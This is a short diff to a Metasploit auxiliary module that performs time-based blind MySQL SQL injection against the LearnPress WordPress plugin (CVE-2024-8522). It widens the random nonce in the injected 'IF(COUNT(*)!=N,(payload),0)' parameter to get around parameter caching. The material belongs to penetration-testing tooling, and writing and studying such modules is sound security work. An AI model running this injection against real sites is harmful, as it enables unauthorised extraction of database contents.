@@ -67,7 +67,8 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Performing SQL injection for #{description} via the '#{sqli_param}' parameter...")
 
     @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind) do |payload|
-      random_negative_number = -Rex::Text.rand_text_numeric(2).to_i
+      # LearnPress caches request parameters; use a wide per-request timing nonce.
+      random_negative_number = -rand(1_000_000_000..9_999_999_999)
       vars_get = { sqli_param => "IF(COUNT(*)!=#{random_negative_number},(#{payload}),0)" }.merge(additional_params)
 
       vars_get['rest_route'] = path if action.name.downcase.include?('cve-2024-8522')
